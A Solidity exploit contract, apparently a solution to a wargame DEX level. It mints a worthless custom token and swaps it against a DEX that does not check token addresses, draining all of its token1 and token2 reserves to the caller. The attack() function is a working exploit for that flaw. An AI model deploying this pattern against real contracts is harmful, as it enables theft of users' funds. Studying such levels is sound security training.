// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
/**
I will create a token called myToken
i'll swap from myToken to token1 in a way swapAmount would be 100
I'll repeat the same method with token 2 .
And this will pass the level

first dex has 100/100/100 . (token1/token2/mytoken)
And if i want to swap 100 mytoken for token1 .
SwapAmount would be 100 so i'll get all the 100 of token 1 .
now the dex has 0/100/200

now i want to know x the amount that verifies:
swapAmount(mytoken , token2 , x) =100
(100*x)/200 = 100 ---> x=200

I'll swap 200 of the  mytoken . 
So the plan goes like this : 
create a token , mint 400 of it . 
give the dex 100 , give the hacking contract 300 . 
the hacking contract will then swap 100 of it with 100 token1.
And then 200 of it with 100 token2 .

  */
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
interface Dex  {
  function token1() external view returns (address);
  function token2() external view returns (address);
  function setTokens(address _token1, address _token2) external ;
  function addLiquidity(address token_address, uint amount) external ;
  function swap(address from, address to, uint amount) external ;
  function getSwapPrice(address from, address to, uint amount) external  view returns(uint) ;
  function approve(address spender, uint amount) external ;
  function balanceOf(address token, address account) external  view returns (uint);
}

contract MyToken is IERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}

contract hack {
  Dex public  dex ;
  IERC20 public token1;
  IERC20 public token2;
  IERC20 myToken;


  constructor(address _dex , address _myToken) {
    dex = Dex(_dex);
    token1  = IERC20(dex.token1());
    token2  = IERC20(dex.token2());
    myToken = IERC20(_myToken);
  }


    function attack() public {
        dex.approve(address(dex), 100000);
        myToken.approve(address(dex), 100000);

        dex.swap(address(myToken),address(token1),100);
        require(token1.balanceOf(address(this)) == 100 , "first swap failed");

        dex.swap(address(myToken),address(token2),200);
        require(token1.balanceOf(address(this)) == 100 , "first swap failed");


        token1.transfer(msg.sender, 100);
        token2.transfer(msg.sender, 100);
    }

}

